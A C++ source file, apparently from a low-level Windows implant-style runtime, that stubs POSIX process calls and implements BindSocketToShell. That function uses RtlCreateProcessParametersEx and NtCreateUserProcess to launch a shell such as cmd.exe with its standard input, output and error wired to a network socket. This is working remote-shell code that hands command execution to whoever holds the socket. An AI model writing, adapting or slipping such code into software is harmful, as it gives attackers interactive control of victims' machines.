/**
 * process.cc - Windows Process Execution Implementation
 *
 * Provides process creation with socket redirection via NTDLL.
 *
 * NOTE: Windows process creation with socket handle redirection is complex.
 * This implementation uses NtCreateUserProcess with redirected standard handles.
 */

#include "process.h"
#include "ntdll.h"
#include "memory.h"
#include "peb.h"

// Process creation structures for Windows
struct PS_ATTRIBUTE
{
    USIZE Attribute;
    USIZE Size;
    union
    {
        USIZE Value;
        PVOID ValuePtr;
    };
    PUSIZE ReturnLength;
};

struct PS_ATTRIBUTE_LIST
{
    USIZE TotalLength;
    PS_ATTRIBUTE Attributes[2];
};

struct PS_CREATE_INFO
{
    USIZE Size;
    USIZE State;
    union
    {
        struct
        {
            union
            {
                UINT32 InitFlags;
                struct
                {
                    UINT8 WriteOutputOnExit : 1;
                    UINT8 DetectManifest : 1;
                    UINT8 IFEOSkipDebugger : 1;
                    UINT8 IFEODoNotPropagateKeyState : 1;
                    UINT8 SpareBits1 : 4;
                    UINT8 SpareBits2 : 8;
                    UINT16 ProhibitedImageCharacteristics;
                };
            };
            UINT32 AdditionalFileAccess;
        } InitState;

        struct
        {
            PVOID FileHandle;
        } FailSection;

        struct
        {
            UINT16 DllCharacteristics;
        } ExeFormat;

        struct
        {
            PVOID IFEOKey;
        } ExeName;

        struct
        {
            union
            {
                UINT32 OutputFlags;
                struct
                {
                    UINT8 ProtectedProcess : 1;
                    UINT8 AddressSpaceOverride : 1;
                    UINT8 DevOverrideEnabled : 1;
                    UINT8 ManifestDetected : 1;
                    UINT8 ProtectedProcessLight : 1;
                    UINT8 SpareBits1 : 3;
                    UINT8 SpareBits2 : 8;
                    UINT16 SpareBits3;
                };
            };
            PVOID FileHandle;
            PVOID SectionHandle;
            UINT64 UserProcessParametersNative;
            UINT32 UserProcessParametersWow64;
            UINT32 CurrentParameterFlags;
            UINT64 PebAddressNative;
            UINT32 PebAddressWow64;
            UINT64 ManifestAddress;
            UINT32 ManifestSize;
        } SuccessState;
    };
};

// PS_ATTRIBUTE constants
constexpr USIZE PS_ATTRIBUTE_IMAGE_NAME = 0x00020005;
constexpr USIZE PS_ATTRIBUTE_STD_HANDLE_INFO = 0x00010000;
constexpr USIZE PS_STD_INPUT_HANDLE = 0x1;
constexpr USIZE PS_STD_OUTPUT_HANDLE = 0x2;
constexpr USIZE PS_STD_ERROR_HANDLE = 0x4;

// Process creation flags
constexpr UINT32 PROCESS_CREATE_FLAGS_INHERIT_HANDLES = 0x00000004;

// Windows doesn't have fork() - use stub implementation
SSIZE Process::Fork() noexcept
{
    // Windows doesn't support fork()
    return PROCESS_INVALID_PID;
}

// Windows doesn't have dup2 in the same way - stub
SSIZE Process::Dup2(SSIZE oldfd, SSIZE newfd) noexcept
{
    (void)oldfd;
    (void)newfd;
    return PROCESS_INVALID_PID;
}

// Windows doesn't have execve - stub
SSIZE Process::Execve(const CHAR* pathname, CHAR* const argv[], CHAR* const envp[]) noexcept
{
    (void)pathname;
    (void)argv;
    (void)envp;
    return PROCESS_INVALID_PID;
}

// Windows doesn't have setsid - stub
SSIZE Process::Setsid() noexcept
{
    return PROCESS_INVALID_PID;
}

// Helper to convert CHAR* to UNICODE_STRING
static void InitUnicodeString(UNICODE_STRING* dest, const WCHAR* src, USIZE len)
{
    dest->Buffer = const_cast<WCHAR*>(src);
    dest->Length = (UINT16)(len * sizeof(WCHAR));
    dest->MaximumLength = (UINT16)((len + 1) * sizeof(WCHAR));
}

// BindSocketToShell - Create a process with socket redirected to stdin/stdout/stderr
// The cmd parameter must be a full path to the executable (e.g., "C:\Windows\System32\cmd.exe")
// Caller is responsible for providing the correct path (e.g., via environment variable COMSPEC)
SSIZE Process::BindSocketToShell(SSIZE socketFd, const CHAR* cmd) noexcept
{
    if (socketFd < 0 || cmd == nullptr)
    {
        return PROCESS_INVALID_PID;
    }

    // Socket handle for redirection
    PVOID socketHandle = (PVOID)socketFd;

    // Build NT path from provided process path
    // NtCreateUserProcess requires full NT paths like \??\C:\Windows\System32\cmd.exe
    // Caller must provide full path (e.g., from env("COMSPEC"))
    WCHAR imagePathBuf[512];
    USIZE imagePathLen = 0;

    // Prepend \??\ NT prefix to the provided path
    imagePathBuf[0] = L'\\';
    imagePathBuf[1] = L'?';
    imagePathBuf[2] = L'?';
    imagePathBuf[3] = L'\\';
    imagePathLen = 4;

    // Copy the provided path (must be full path like C:\Windows\System32\cmd.exe)
    USIZE i = 0;
    while (cmd[i] != '\0' && imagePathLen < 511)
    {
        imagePathBuf[imagePathLen++] = (WCHAR)cmd[i++];
    }
    imagePathBuf[imagePathLen] = L'\0';

    // Convert command to wide string for command line
    WCHAR cmdWide[256];
    USIZE cmdLen = 0;
    while (cmd[cmdLen] != '\0' && cmdLen < 255)
    {
        cmdWide[cmdLen] = (WCHAR)cmd[cmdLen];
        cmdLen++;
    }
    cmdWide[cmdLen] = L'\0';

    // Build image path and command line
    UNICODE_STRING imagePath;
    UNICODE_STRING commandLine;
    InitUnicodeString(&imagePath, imagePathBuf, imagePathLen);
    InitUnicodeString(&commandLine, cmdWide, cmdLen);

    // Create process parameters
    PVOID processParams = nullptr;
    NTSTATUS status = NTDLL::RtlCreateProcessParametersEx(
        &processParams,
        &imagePath,
        nullptr,  // DllPath
        nullptr,  // CurrentDirectory
        &commandLine,
        nullptr,  // Environment
        nullptr,  // WindowTitle
        nullptr,  // DesktopInfo
        nullptr,  // ShellInfo
        nullptr,  // RuntimeData
        0x01      // RTL_USER_PROC_PARAMS_NORMALIZED
    );

    if (!NT_SUCCESS(status) || processParams == nullptr)
    {
        return PROCESS_INVALID_PID;
    }

    // Set standard handles in process parameters to redirect I/O to socket
    PRTL_USER_PROCESS_PARAMETERS params = (PRTL_USER_PROCESS_PARAMETERS)processParams;
    params->StandardInput = socketHandle;
    params->StandardOutput = socketHandle;
    params->StandardError = socketHandle;

    // Create process info
    PS_CREATE_INFO createInfo;
    Memory::Zero(&createInfo, sizeof(createInfo));
    createInfo.Size = sizeof(createInfo);

    // Create attribute list for image name and handle inheritance
    PS_ATTRIBUTE_LIST attrList;
    Memory::Zero(&attrList, sizeof(attrList));
    attrList.TotalLength = sizeof(PS_ATTRIBUTE_LIST);

    // Set up image name attribute (required for NtCreateUserProcess)
    attrList.Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    attrList.Attributes[0].Size = imagePath.Length;
    attrList.Attributes[0].ValuePtr = imagePath.Buffer;

    // Set up standard handle redirection attribute
    attrList.Attributes[1].Attribute = PS_ATTRIBUTE_STD_HANDLE_INFO;
    attrList.Attributes[1].Size = sizeof(USIZE);
    attrList.Attributes[1].Value = PS_STD_INPUT_HANDLE | PS_STD_OUTPUT_HANDLE | PS_STD_ERROR_HANDLE;

    PVOID processHandle = nullptr;
    PVOID threadHandle = nullptr;

    status = NTDLL::NtCreateUserProcess(
        &processHandle,
        &threadHandle,
        0x1FFFFF,  // PROCESS_ALL_ACCESS
        0x1FFFFF,  // THREAD_ALL_ACCESS
        nullptr,   // ProcessObjectAttributes
        nullptr,   // ThreadObjectAttributes
        PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
        0,         // ThreadFlags
        processParams,
        &createInfo,
        &attrList
    );

    // Clean up process parameters
    NTDLL::RtlDestroyProcessParameters(processParams);

    if (!NT_SUCCESS(status))
    {
        return PROCESS_INVALID_PID;
    }

    // Close thread handle - we only need process handle
    if (threadHandle)
    {
        NTDLL::NtClose(threadHandle);
    }

    // Return a pseudo-PID (actually the process handle value for Windows)
    return (SSIZE)processHandle;
}
